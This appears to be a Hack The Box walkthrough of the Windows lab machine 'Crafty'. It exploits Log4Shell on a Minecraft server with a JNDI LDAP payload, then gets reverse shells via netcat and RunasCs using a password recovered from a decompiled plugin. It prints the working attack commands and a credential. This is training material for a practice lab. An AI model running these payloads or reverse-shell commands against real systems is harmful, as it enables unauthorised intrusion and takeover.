# Introduction

- **Name:** [Crafty](https://app.hackthebox.com/machines/Crafty)
- **OS:** Windows
- **Difficulty:** Easy
- **IP:** `10.129.77.132`

> **Info:** The IP Address may change during the walk-through.

---

# Enumeration

Let's begin with port and services enumeration:

## Port Scan (TCP)

First, I will run the command `sudo nmap -p- -sS -Pn -n --disable-arp --open -vvv -oG tcpPorts <IP>`. This command will run an open **TCP** ports enumeration against all the `65,535` TCP ports.

```java
❯ sudo nmap -p- -sS -Pn -n --disable-arp --open -vvv -oG tcpPorts 10.129.77.132
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-29 16:45 -0400
Initiating SYN Stealth Scan at 16:45
Scanning 10.129.77.132 [65535 ports]
Discovered open port 80/tcp on 10.129.77.132
SYN Stealth Scan Timing: About 7.06% done; ETC: 16:52 (0:06:48 remaining)
SYN Stealth Scan Timing: About 14.10% done; ETC: 16:52 (0:06:12 remaining)
SYN Stealth Scan Timing: About 21.74% done; ETC: 16:52 (0:05:28 remaining)
SYN Stealth Scan Timing: About 32.67% done; ETC: 16:51 (0:04:09 remaining)
SYN Stealth Scan Timing: About 46.47% done; ETC: 16:50 (0:02:54 remaining)
SYN Stealth Scan Timing: About 71.42% done; ETC: 16:49 (0:01:12 remaining)
Discovered open port 25565/tcp on 10.129.77.132
Completed SYN Stealth Scan at 16:48, 209.04s elapsed (65535 total ports)
Nmap scan report for 10.129.77.132
Host is up, received user-set (0.074s latency).
Scanned at 2026-10-29 16:45:26 AST for 209s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
80/tcp    open  http      syn-ack ttl 127
25565/tcp open  minecraft syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 209.09 seconds
           Raw packets sent: 131220 (5.774MB) | Rcvd: 153 (6.732KB)
```

As we see the open ports are `80/tcp` and `25565/tcp`.

## Service Scan

Now let's do a scan to know which ports are open, but now let's see what services are running on them. For this I'll use the command `nmap -p<ports> -sCV -vvv <IP> -oA TCPservices`.

```java
nmap -p80,25565 -sCV -vvv 10.129.77.132 -oA TCPservices
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-29 16:54 -0400
....

PORT      STATE SERVICE   REASON          VERSION
80/tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
25565/tcp open  minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

We can see some interesting information from this output:

- **Microsoft IIS** web server: Information that can lead us to think that Windows is running on the machine.
- **Minecraft 1.16.5 server**.
- **Redirect to `crafty.htb`**.

## Os Discovery

When we do a ping to a host there is a block named `TTL (Time-To-Live)` that is the maximum hops that a packet can do. We can base on this to know what operating system is running on the target host. We can use the table below:

|OS|TTL|
|---|---|
|Linux|64|
|Windows|128|

This is not a 100% conclusion, but in most cases it can be useful.

```java
❯ ping -c 1 10.129.77.132
PING 10.129.77.132 (10.129.77.132) 56(84) bytes of data.
64 bytes from 10.129.77.132: icmp_seq=1 ttl=127 time=72.5 ms

--- 10.129.77.132 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 72.541/72.541/72.541/0.000 ms
```

As we can see the `TTL` that we receive with the ping is `127` that tells us that target machine OS is Windows.

---

# Web Information Gathering

As we saw before the web was redirecting to `crafty.htb` and our machine doesn't have that domain and cannot resolve it:  
![](resources/Pasted%20image%2020261029171954.png)

That's because the web is using virtual-hosting, so we add that domain in the `/etc/hosts`:

```java
❯ cat /etc/hosts
─────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: /etc/hosts
─────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ # Host addresses
   2 │ 127.0.0.1  localhost
   3 │ 127.0.1.1  parrot
   4 │ ::1        localhost ip6-localhost ip6-loopback
   5 │ ff02::1    ip6-allnodes
   6 │ ff02::2    ip6-allrouters
   7 │ # Others
   8 │ 10.129.77.132 crafty.htb
   9 │ 
─────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Technologies Discovery

We can use `whatweb` to try to identify the web technologies in use on the web page:

```java
❯ whatweb http://crafty.htb/
http://crafty.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.77.132], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]
```

## Access the Web

![](resources/Pasted%20image%2020261029172627.png)

When we enter the web we see it is a web for a **Minecraft server** promotion (`play.crafty.htb`) and we saw that there was a Minecraft server running on the machine.

> To not make it too long, web exploitation isn't the way.

---

# Look for Vulnerability

If we search for Minecraft 1.16.5 vulnerabilities, we will find a lot of information that says this version of Minecraft is vulnerable to a popular vulnerability known as **[Log4Shell (CVE-2021-44228)](https://www.ibm.com/think/topics/log4shell)**. This is a vulnerability in the Log4j library used for a lot of java applications (like Minecraft). This vulnerability is a **remote code execution (RCE)**.

![](resources/Pasted%20image%2020261029174408.png)

---

# Connect to Minecraft Server

To connect to the server I will use the [Minecraft-Console-Client](https://github.com/MCCTeam/Minecraft-Console-Client):

```java
❯ ./MinecraftClient
```

![](resources/Pasted%20image%2020261029175527.png)

Execute it, then introduce the server IP address and it's already connected.

> **Info:** The first time it may ask you for an account, just select offline account and enter a name.

---

# Gaining Access

To exploit this I'm going to use this POC exploit I found on GitHub: [log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc).

Execute the `poc.py` script:

```java
py poc.py --userip 10.10.15.36 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.15.36:1389/a}
[+] Starting Webserver on port 8000 http://0.0.0.0:8000

Listening on 0.0.0.0:1389
```

Start a `ncat` listener:

```java
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

Send the jndi message (`${jndi:ldap://10.10.15.36:1389/a}`) on the Minecraft chat:  
![](resources/Pasted%20image%2020261029181342.png)

```java
❯ rlwrap nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.129.77.143 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>cd ..
cd ..

c:\Users\svc_minecraft>type Desktop\user.txt
type Desktop\user.txt
e8d1c3f4787e47bba9ace79110e6e2e8

c:\Users\svc_minecraft>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft

10/29/2026  03:22 PM    <DIR>          .
10/29/2026  03:22 PM    <DIR>          ..
02/05/2024  07:02 AM    <DIR>          3D Objects
02/05/2024  07:02 AM    <DIR>          Contacts
02/05/2024  07:02 AM    <DIR>          Desktop
02/05/2024  07:02 AM    <DIR>          Documents
02/05/2024  07:02 AM    <DIR>          Downloads
02/05/2024  07:02 AM    <DIR>          Favorites
02/05/2024  07:02 AM    <DIR>          Links
02/05/2024  07:02 AM    <DIR>          Music
02/05/2024  07:02 AM    <DIR>          Pictures
02/05/2024  07:02 AM    <DIR>          Saved Games
02/05/2024  07:02 AM    <DIR>          Searches
10/26/2023  06:37 PM    <DIR>          server
02/05/2024  07:02 AM    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)   3,493,232,640 bytes free

c:\Users\svc_minecraft>
```

And we got a reverse shell!.

> **Info:** If the exploit didn't work it's because of the file `Exploit.java`. You should change the variable `cmd` (line 12) from `/bin/bash` to `cmd.exe`.

---

# Privilege Escalation

Looking on the Minecraft server folder, we found the file `playercounter-1.0-SNAPSHOT.jar` that is a plugin.

```java
c:\Users\svc_minecraft\server>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\server

10/26/2023  06:37 PM    <DIR>          .
10/26/2023  06:37 PM    <DIR>          ..
11/14/2023  11:00 PM                 2 banned-ips.json
11/14/2023  11:00 PM                 2 banned-players.json
10/24/2023  01:48 PM               183 eula.txt
10/29/2026  03:23 PM    <DIR>          logs
11/15/2023  12:22 AM                 2 ops.json
10/27/2023  02:48 PM    <DIR>          plugins
10/24/2023  01:43 PM        37,962,360 server.jar
11/14/2023  11:00 PM             1,130 server.properties
10/29/2026  03:24 PM               103 usercache.json
10/24/2023  01:51 PM                 2 whitelist.json
10/29/2026  03:23 PM    <DIR>          world
               8 File(s)     37,963,784 bytes
               5 Dir(s)   3,892,289,536 bytes free

c:\Users\svc_minecraft\server>cd plugins
cd plugins

c:\Users\svc_minecraft\server\plugins>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\server\plugins

10/27/2023  02:48 PM    <DIR>          .
10/27/2023  02:48 PM    <DIR>          ..
10/27/2023  02:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File(s)          9,996 bytes
               2 Dir(s)   3,855,683,584 bytes free

c:\Users\svc_minecraft\server\plugins>
```

## Transferring File

I transferred it to my attacker machine:  
**Attacker machine:**

```java
❯ impacket-smbserver smbFolder $(pwd) -smb2support -username Test -password Test123
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

**Victim machine:**

```java
c:\Users\svc_minecraft\server\plugins>net use \\10.10.15.36 /u:Test Test123
net use \\10.10.15.36 /u:Test Test123
The command completed successfully.


c:\Users\svc_minecraft\server\plugins>copy playercounter-1.0-SNAPSHOT.jar \\10.10.15.36\smbFolder\playercounter-1.0-SNAPSHOT.jar
copy playercounter-1.0-SNAPSHOT.jar \\10.10.15.36\smbFolder\playercounter-1.0-SNAPSHOT.jar
        1 file(s) copied.

c:\Users\svc_minecraft\server\plugins>
```

## Analyzing File

Let's use the [`jd-gui`](https://github.com/java-decompiler/jd-gui) tool to decompile the `.jar` file:

```java
❯ ls
 playercounter-1.0-SNAPSHOT.jar
❯ jd-gui playercounter-1.0-SNAPSHOT.jar &>/dev/null & disown
```

![](resources/Pasted%20image%2020261029194522.png)  
Investigating in the decompiled content we found this key.

## Test Users Passwords

Now that we found this key let's try it as a user password. For this I'm going to use the **[RunasCs](https://github.com/antonioCoco/RunasCs/)**. This tool is useful because it gives you the possibility to execute a process as another user (using credentials).

**Upload to the machine:**

```
C:\Windows\Temp\Test>net use \\10.10.15.36 /u:Test Test123
net use \\10.10.15.36 /u:Test Test123
The command completed successfully.

C:\Windows\Temp\Test>copy \\10.10.15.36\smbFolder\RunasCs.exe RunasCs.exe
copy \\10.10.15.36\smbFolder\RunasCs.exe RunasCs.exe
        1 file(s) copied.

C:\Windows\Temp\Test>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of C:\Windows\Temp\Test

10/29/2026  05:44 PM    <DIR>          .
10/29/2026  05:44 PM    <DIR>          ..
05/19/2023  09:37 PM            51,712 RunasCs.exe
               1 File(s)         51,712 bytes
               2 Dir(s)   3,794,497,536 bytes free

C:\Windows\Temp\Test>
```

**See users in the system:**

```powershell
C:\Windows\Temp\Test>net users
net users

User accounts for \\CRAFTY

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
jacob                    svc_minecraft            WDAGUtilityAccount       
The command completed successfully.
```

We can see there are two users: `Jacob` and `Administrator`. Let's try with both:

**Execute `whoami` command:**

```java
C:\Windows\Temp\Test>.\RunasCs.exe jacob s67u84zKq8IXw "cmd /c whoami"
.\RunasCs.exe jacob s67u84zKq8IXw "cmd /c whoami"
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
C:\Windows\Temp\Test>.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"
.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"

crafty\administrator

C:\Windows\Temp\Test>
```

As we saw the credential corresponds to the user `Administrator`.

## Establish Reverse Shell

First let's upload the `nc.exe` binary to the victim machine:

```java
C:\Windows\Temp\Test>copy \\10.10.15.36\smbFolder\nc.exe nc.exe
copy \\10.10.15.36\smbFolder\nc.exe nc.exe
        1 file(s) copied.

C:\Windows\Temp\Test>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of C:\Windows\Temp\Test

10/29/2026  06:07 PM    <DIR>          .
10/29/2026  06:07 PM    <DIR>          ..
10/28/2026  04:31 PM            28,160 nc.exe
05/19/2023  09:37 PM            51,712 RunasCs.exe
               2 File(s)         79,872 bytes
               2 Dir(s)   3,794,165,760 bytes free

C:\Windows\Temp\Test>
```

And now let's just run the reverse shell:

**Listener:**

```java
❯ nc -nlvp 444
Listening on 0.0.0.0 444
```

**Execute the reverse shell:**

```java
C:\Windows\Temp\Test>.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c C:\Windows\Temp\Test\nc.exe 10.10.15.36 444 -e cmd.exe"
.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c C:\Windows\Temp\Test\nc.exe 10.10.15.36 444 -e cmd.exe"
```

**PWN**

```java
❯ nc -nlvp 444
Listening on 0.0.0.0 444
Connection received on 10.129.77.143 49686
Microsoft Windows [Version 10.0.17763.5328]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of C:\Users\Administrator\Desktop

02/05/2024  07:05 AM    <DIR>          .
02/05/2024  07:05 AM    <DIR>          ..
10/29/2026  03:23 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,794,165,760 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
938ef316c9d90d83d535854b1f6536c4

C:\Users\Administrator\Desktop>
```

---

In that way we access as Administrator on the target system and complete the machine. Thank you for staying until the end!
